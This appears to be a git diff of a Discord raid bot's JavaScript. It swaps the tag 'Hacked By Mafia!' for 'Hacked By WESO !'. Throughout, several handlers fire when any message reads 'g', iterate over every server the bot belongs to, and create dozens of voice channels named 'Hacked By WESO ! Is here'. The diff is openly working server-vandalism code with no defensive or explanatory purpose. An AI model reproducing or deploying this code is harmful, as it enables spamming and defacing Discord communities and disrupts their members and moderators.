+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
 
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-                   
-                   
-                   
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
 
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-nel('  Hacked By Mafia! Is here', 'voice');
-}
-});
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
 
-hngel.on('message', message => {
-         if (message.content === "g") {
-                 hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
 })
 }
 });
@@ -1491,46 +944,481 @@ m.createChannel('  Hacked By Mafia! Is here', 'voice');
 hngel.on('message', message => {
          if (message.content === "g") {
                  hngel.guilds.forEach(m =>{
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-                   
-                   
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
 
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
-m.createChannel('  Hacked By Mafia! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+})
+}
+});
+
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+})
+}
+});
+
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+})
+}
+});
+
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+})
+}
+});
+
+hngel.on('message', message => {
+         if (message.content === "g") {
+                 hngel.guilds.forEach(m =>{
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
+m.createChannel('  Hacked By WESO ! Is here', 'voice');
